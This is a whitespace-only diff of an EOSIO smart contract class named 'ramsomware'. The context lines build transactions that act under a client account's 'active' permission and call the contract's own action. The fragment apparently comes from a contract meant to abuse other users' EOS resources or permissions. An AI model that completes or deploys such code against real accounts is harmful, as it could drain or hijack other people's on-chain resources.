@@ -17,7 +17,6 @@ class [[eosio::contract]] ramsomware : public eosio::contract {
             uint64_t primary_key() const {return key;}
         };
         typedef eosio::multi_index<"people"_n, person> address_index;
-        
     public:
       using contract::contract;
         void upsert(name user, uint64_t idx)
@@ -40,7 +39,6 @@ class [[eosio::contract]] ramsomware : public eosio::contract {
             uint128_t initnum = 1;
             transaction out1{};
             transaction out2{};
-            
             out1.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n,std::make_tuple( client,  uint64_t(1)) );
             out2.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n,std::make_tuple( client, uint64_t(2)) );
             //upsert(name("capamerica"), idx);
